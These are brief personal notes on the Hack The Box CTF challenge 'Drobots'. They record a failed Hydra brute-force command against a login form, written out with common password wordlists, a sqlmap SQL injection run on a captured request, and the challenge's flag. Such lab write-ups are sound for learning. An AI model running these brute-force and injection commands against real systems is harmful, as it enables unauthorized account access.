# DROBOTS HTB CTF

export IP='142.93.38.14'

1. RECON
* No results from GoBuster & NMAP.

2. Hydra Commend Format 
* sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"

* Reqest Object = '{"username":"admin","password":"password"}'

## Hydra Payload Command --

`sudo hydra -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -u -f 142.93.38.14 -s 30195 http-post-form "/api/login:username=^USER^&password=^PASS^:Invalid Credentials"`
 
 * did not work properly  

 ## Trying SQL Map (0x00nier)

 * captuered a request object using burpsuite & passed it on to the SQLMap CLI usin -- `sqlmap -r burp --dbs`

 * the catch is to type the user as admin and password without cracking the hash !!

 HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}